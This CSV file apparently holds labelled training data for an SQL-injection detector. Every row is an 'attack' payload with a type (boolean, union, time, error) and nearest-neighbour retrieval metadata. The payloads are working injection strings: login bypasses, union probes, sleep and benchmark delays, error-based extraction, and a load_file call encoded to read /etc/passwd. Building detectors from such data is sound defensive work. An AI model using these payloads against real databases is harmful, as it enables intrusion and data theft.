id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000426,attack,boolean,"1 where 6044  =  6044 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R006503,0.04426177016995638
SMOTE_000427,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R001999,0.9752465933619692
SMOTE_000428,attack,time,1%'  )   or sleep  (  5  )  #,nearest_attack_euclidean,R008211,0.43585118843632953
SMOTE_000429,attack,boolean,-7633'  )   as aslj where 2317  =  2317 or 8571  =  8571--,nearest_attack_euclidean,R007892,0.09113710209185849
SMOTE_000430,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R001902,0.008007497143485766
SMOTE_000431,attack,boolean,1'   )    )     )   and 2006  =  2006,nearest_attack_euclidean,R008235,0.23106901471640157
SMOTE_000432,attack,boolean,"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  4003  =  4003",nearest_attack_euclidean,R005054,0.5810856380979867
SMOTE_000433,attack,union,"1%' union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001407,0.012003467572480093
SMOTE_000434,attack,other,select   (  case when   (  7033  =  1594  )   then 7033 else 7033*  (  select 7033 from information_schema.character_sets  )   end  )  #,nearest_attack_euclidean,R004310,1.6858739404357614e-07
SMOTE_000435,attack,union,"1"" where 1203  =  1203 union all select null,null,null--",nearest_attack_euclidean,R004943,0.15491965600309462
SMOTE_000436,attack,boolean,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'cqrp'  =  'cqrp",nearest_attack_euclidean,R007817,0.2815132441489247
SMOTE_000437,attack,boolean,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",nearest_attack_euclidean,R001338,0.18554168079889996
SMOTE_000438,attack,boolean,"1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001870,0.006159990356834068
SMOTE_000439,attack,boolean,"-9613""   )    )     )   or elt  (  3125  =  7084,7084  )   and    (    (     (  ""pupl""  =  ""pupl",nearest_attack_euclidean,R008239,0.08785854641748037
SMOTE_000440,attack,union,"-5859  )   as ernq where 8394  =  8394 union all select 8394,8394,8394--",nearest_attack_euclidean,R000884,0.002503981754978505
SMOTE_000441,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000679,0.28298163925194814
SMOTE_000442,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847",nearest_attack_euclidean,R004315,0.07531653435483664
SMOTE_000443,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R007224,0.18271702215474783
SMOTE_000444,attack,boolean,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,nearest_attack_euclidean,R001725,0.1423924741102417
SMOTE_000445,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R005360,0.5553781143474955
SMOTE_000446,attack,union,-1641' union all select 4835#,nearest_attack_euclidean,R005657,0.07924803633493502
SMOTE_000447,attack,other,1  )   where 3030  =  3030,nearest_attack_euclidean,R006165,0.009793442643543997
SMOTE_000448,attack,other,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",nearest_attack_euclidean,R000935,0.18931202368026348
SMOTE_000449,attack,boolean,"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R008606,0.19943311569814595
SMOTE_000450,attack,union,"-9408%""   )    )    union all select 1841,1841,1841,1841,1841,1841--",nearest_attack_euclidean,R008885,0.10501317640998989
SMOTE_000451,attack,boolean,1'+  (  select 'iqxn' where 1146  =  1146 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',nearest_attack_euclidean,R003564,1.2295695278020702
SMOTE_000452,attack,other,1'||  (  select 'yezk' where 2097  =  2097,nearest_attack_euclidean,R006958,0.03831638994449664
SMOTE_000453,attack,boolean,or x  =  x,nearest_attack_euclidean,R000252,0.20413547142459582
SMOTE_000454,attack,boolean,"-7084  )   where 2260  =  2260 or elt  (  1032  =  1032,3623  )  --",nearest_attack_euclidean,R001425,0.06766341611590591
SMOTE_000455,attack,union,"-1630' union all select 1971,1971--",nearest_attack_euclidean,R007726,0.011819815911462596
SMOTE_000456,attack,union,"1%""   )    )     )   union all select null,null,null#",nearest_attack_euclidean,R002200,0.274738614061134
SMOTE_000457,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",nearest_attack_euclidean,R001802,0.09738911090877932
SMOTE_000458,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R007813,0.20287413988307035
SMOTE_000459,attack,boolean,"1%"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,nearest_attack_euclidean,R003660,0.18518510713277447
SMOTE_000460,attack,boolean,"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""wrbs"" like ""wrbs",nearest_attack_euclidean,R001827,0.0971605613411614
SMOTE_000461,attack,union,"1' where 2964  =  2964 union all select null,null,null#",nearest_attack_euclidean,R006718,0.23523171770176643
SMOTE_000462,attack,boolean," select * from users where id  =  1 or ""1;""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000630,0.06322208249599269
SMOTE_000463,attack,boolean,-2820'   )    )    or 6679  =  8848--,nearest_attack_euclidean,R005229,0.0034082527483241705
SMOTE_000464,attack,boolean,"1' and elt  (  4249  =  4249,7259  )  ",nearest_attack_euclidean,R008044,0.49346332941028775
SMOTE_000465,attack,other,select   (  case when   (  1039  =  5127  )   then 1039 else 1039*  (  select 1039 from information_schema.character_sets  )   end  )  #,nearest_attack_euclidean,R000771,2.384185791015625e-07
SMOTE_000466,attack,error,"1""   )    )    as qvyu where 5962  =  5962 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000971,0.2657806311428335
SMOTE_000467,attack,boolean,"-5928""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""rggt"" like ""rggt",nearest_attack_euclidean,R008872,0.19213766464986154
SMOTE_000468,attack,error,"-2782'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R006533,0.4295980747942681
SMOTE_000469,attack,boolean,-6178   )    )    as lygb where 9559  =  9559 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R007778,0.005816843972512325
SMOTE_000470,attack,boolean,-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--,nearest_attack_euclidean,R005131,0.06878636190381851
SMOTE_000471,attack,union,"-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#",nearest_attack_euclidean,R001752,0.27542182892843714
SMOTE_000472,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R008306,0.6246370833935526
SMOTE_000473,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R002768,0.19162666818895635
SMOTE_000474,attack,union,-7979'+  (  select 'bkvt' where 3613  =  3613 union all select 3613#,nearest_attack_euclidean,R002414,0.2179108925563503
SMOTE_000475,attack,other,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  #",nearest_attack_euclidean,R006691,0.10192046953920511
SMOTE_000476,attack,boolean,1'  )   as xqbq where 1619  =  1619 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R008509,0.06991713531798176
SMOTE_000477,attack,boolean,-1252'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'pzxh' like 'pzxh,nearest_attack_euclidean,R003666,0.3118108957427922
SMOTE_000478,attack,boolean,"1%"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,nearest_attack_euclidean,R003556,0.4447513412604647
SMOTE_000479,attack,boolean,"1'||  (  select 'zifu' from dual where 4822  =  4822 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002053,1.18838187036968
SMOTE_000480,attack,union,"1"" union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R008983,0.23354426933866831
SMOTE_000481,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000127,0.6776416594197798
SMOTE_000482,attack,boolean,"1%'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R005503,2.4374437492554574e-05
SMOTE_000483,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'yaml'  =  'yaml",nearest_attack_euclidean,R004554,0.14037436973068884
SMOTE_000484,attack,union,"1   )    )    union all select null,null--",nearest_attack_euclidean,R008457,0.18515986955399277
SMOTE_000485,attack,time,1'||  (  select 'jmhb' where 1794  =  1794 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003533,0.7640321253703283
SMOTE_000486,attack,time,"1  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R008555,0.19982554135425068
SMOTE_000487,attack,union,"-4056""   )    )     )   union all select 4363,4363,4363,4363,4363,4363,4363,4363#",nearest_attack_euclidean,R000981,0.05503774180454151
SMOTE_000488,attack,boolean,1  )   and 2457  =  8146,nearest_attack_euclidean,R003026,0.49837607347736523
SMOTE_000489,attack,other,1'+  (  select 'cwta' where 6091  =  6091,nearest_attack_euclidean,R000931,0.0
SMOTE_000490,attack,error,"1%""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R002470,0.0712977428384176
SMOTE_000491,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,0.0
SMOTE_000492,attack,boolean,"1' where 5004  =  5004 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001742,0.04654319891292796
SMOTE_000493,attack,time,1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R008975,0.22744078297686338
SMOTE_000494,attack,other,1'  )   as mwpp where 6192  =  6192,nearest_attack_euclidean,R002861,8.429369702178807e-08
SMOTE_000495,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000567,7.125097582596972
SMOTE_000496,attack,boolean,"1'||  (  select 'zifu' from dual where 4822  =  4822 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002053,1.0595161990120627
SMOTE_000497,attack,other,"1""   )    )    as xxdm where 4818  =  4818",nearest_attack_euclidean,R001343,0.006999697778632972
SMOTE_000498,attack,time,"1%"" waitfor delay '0:0:5'--",nearest_attack_euclidean,R006673,0.9436129905730036
SMOTE_000499,attack,union,"1%'   )    )     )   union all select null,null,null,null#",nearest_attack_euclidean,R000918,0.07461425094071625
SMOTE_000500,attack,boolean,"1   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006551,0.05766118430111675
SMOTE_000501,attack,boolean," select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000531,0.06341949184927062
SMOTE_000502,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'stea'  =  'stea,nearest_attack_euclidean,R004822,0.6013603385446739
SMOTE_000503,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R005816,0.16034252444227975
SMOTE_000504,attack,time,"1""   )    )    as gprr where 5975  =  5975 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R008951,0.42091145025937965
SMOTE_000505,attack,other,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",nearest_attack_euclidean,R002165,0.26691300883559016
SMOTE_000506,attack,boolean,"-4615'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'jipk' like 'jipk",nearest_attack_euclidean,R008541,0.16275176274513087
SMOTE_000507,attack,other,"select * from generate_series  (  5846,5846,case when   (  5846  =  5227  )   then 1 else 0 end  )   limit 1--",nearest_attack_euclidean,R003506,4.5668517161305734e-05
SMOTE_000508,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R001230,0.03839922936988358
SMOTE_000509,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R007678,0.25080496282750503
SMOTE_000510,attack,other,"1""  )   as vqkz where 8536  =  8536",nearest_attack_euclidean,R004832,8.429369702178807e-08
SMOTE_000511,attack,boolean,"1%""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R003033,0.04902080550088532
SMOTE_000512,attack,other,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",nearest_attack_euclidean,R000035,6.77402901065398
SMOTE_000513,attack,boolean,"1""  )   as vcir where 6275  =  6275 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002347,0.05167554909346716
SMOTE_000514,attack,time,1%'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R008417,0.14910360211762674
SMOTE_000515,attack,other,1'||  (  select 'sbft' where 8748  =  8748,nearest_attack_euclidean,R003167,0.009781539588524674
SMOTE_000516,attack,other,1' rlike   (  select   (  case when   (  5384  =  7060  )   then 1 else 0x28 end   )    ) ,nearest_attack_euclidean,R006649,1.355171764143297
SMOTE_000517,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R003089,0.02224552522715137
SMOTE_000518,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R008137,0.589688380505654
SMOTE_000519,attack,time,"1%'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R005350,0.26894586863759556
SMOTE_000520,attack,error,1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'ixzr'  =  'ixzr,nearest_attack_euclidean,R003028,0.1274875394631041
SMOTE_000521,attack,other,"1%""",nearest_attack_euclidean,R002900,1.9411578951899273
SMOTE_000522,attack,other,"admin"" --",nearest_attack_euclidean,R009032,0.8888071642067734
SMOTE_000523,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""vcvb"" like ""vcvb",nearest_attack_euclidean,R002366,0.5403826546761281
SMOTE_000524,attack,other,"1',  (  select   (  case when   (  1392  =  1380  )   then 1 else 1392*  (  select 1392 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R001618,0.8706712751058376
SMOTE_000525,attack,boolean,"1%""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,nearest_attack_euclidean,R005590,0.21011774835999472
SMOTE_000526,attack,other,1'  )   as jlae where 1650  =  1650,nearest_attack_euclidean,R006324,0.02316884125938993
SMOTE_000527,attack,boolean,"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004668,0.09864957853603497
SMOTE_000528,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000426,0.08934280342940135
SMOTE_000529,attack,union,"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#",nearest_attack_euclidean,R000871,0.23762715244565003
SMOTE_000530,attack,union,"-9758'+  (  select 'rlcy' where 3691  =  3691 union all select 3691,3691,3691,3691,3691,3691,3691--",nearest_attack_euclidean,R007905,0.02771754239271783
SMOTE_000531,attack,boolean,or 1  =  1 --,nearest_attack_euclidean,R000014,0.6338798603904325
SMOTE_000532,attack,union,"1  )   as asmt where 4986  =  4986 union all select null,null#",nearest_attack_euclidean,R004513,0.08703584374700002
SMOTE_000533,attack,boolean,"1%'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R005014,0.1574351540867783
SMOTE_000534,attack,boolean,"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'zpzf'  =  'zpzf",nearest_attack_euclidean,R001233,0.27468223908467404
SMOTE_000535,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R007022,0.21739533560448387
SMOTE_000536,attack,union,"-1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",nearest_attack_euclidean,R003227,0.2172324303822902
SMOTE_000537,attack,union,"1' in boolean mode  )   union all select null,null#",nearest_attack_euclidean,R004522,0.412632268514583
SMOTE_000538,attack,time,"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",nearest_attack_euclidean,R000672,0.2285988481351315
SMOTE_000539,attack,boolean,"1  )   as jqbv where 8172  =  8172 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R008797,0.11280564345511704
SMOTE_000540,attack,other,1 where 9872  =  9872,nearest_attack_euclidean,R000894,1.6858739404357614e-07
SMOTE_000541,attack,other,1' in boolean mode  )   order by 1--,nearest_attack_euclidean,R001422,0.5934665971821724
SMOTE_000542,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'opyt'  =  'opyt",nearest_attack_euclidean,R007270,0.5378886257715735
SMOTE_000543,attack,time,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,nearest_attack_euclidean,R003090,0.3419014060017686
SMOTE_000544,attack,union,"-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#",nearest_attack_euclidean,R005857,0.04112771036029227
SMOTE_000545,attack,boolean,"1 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R007377,0.0028818227986674313
SMOTE_000546,attack,boolean,"1   )    )    as qfnu where 1609  =  1609 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R007234,0.010543801344628047
SMOTE_000547,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'yaje'  =  'yaje",nearest_attack_euclidean,R004395,0.05292335432225922
SMOTE_000548,attack,boolean,"admin"" or ""1""  =  ""1""#",nearest_attack_euclidean,R000470,1.5049584633086925
SMOTE_000549,attack,error,"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cbwx'  =  'cbwx",nearest_attack_euclidean,R005886,0.07301524752424515
SMOTE_000550,attack,union,"-3747""  )   union all select 8962,8962,8962,8962,8962#",nearest_attack_euclidean,R008414,0.11829521745642622
SMOTE_000551,attack,other,"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  # jpau",nearest_attack_euclidean,R008858,1.1861288621983441
SMOTE_000552,attack,boolean,"1' in boolean mode  )   and make_set  (  8403  =  8403,8899  )  #",nearest_attack_euclidean,R007359,0.4713191940457707
SMOTE_000553,attack,time,1  )   as xylu where 3338  =  3338 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R001911,0.04919383980748901
SMOTE_000554,attack,union,"1%""   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000956,0.10154956777169363
SMOTE_000555,attack,other,select case when 3076  =  1605 then 1 else null end--,nearest_attack_euclidean,R001563,1.1920928955078125e-07
SMOTE_000556,attack,other,"make_set  (  7729  =  7729,1  )  ",nearest_attack_euclidean,R002029,0.3583050511552842
SMOTE_000557,attack,error,1   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5139  =  5139,nearest_attack_euclidean,R002038,0.3216529725727276
SMOTE_000558,attack,boolean,"1   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R006320,0.20251542453573745
SMOTE_000559,attack,other,1' order by 1--,nearest_attack_euclidean,R001914,0.359937079509626
SMOTE_000560,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000080,20.343638771143915
SMOTE_000561,attack,boolean,1'   )    )    as jzoh where 6484  =  6484 and 7364  =  4233--,nearest_attack_euclidean,R002575,0.22563308534269094
SMOTE_000562,attack,union,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",nearest_attack_euclidean,R007394,0.1412851148809392
SMOTE_000563,attack,boolean,1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R008276,0.8420176532773179
SMOTE_000564,attack,boolean, or 1 in   (  select @@version  )  --,nearest_attack_euclidean,R000101,0.57100888707719
SMOTE_000565,attack,other,password:*/  =  1--,nearest_attack_euclidean,R000399,0.45122502860151426
SMOTE_000566,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R002184,0.2769482079216332
SMOTE_000567,attack,error,"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'rggg'  =  'rggg",nearest_attack_euclidean,R001335,0.10580911681584022
SMOTE_000568,attack,time,"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R004879,0.033892485012457854
SMOTE_000569,attack,boolean,1'  )   and 2577  =  7094,nearest_attack_euclidean,R004532,0.10672183170669432
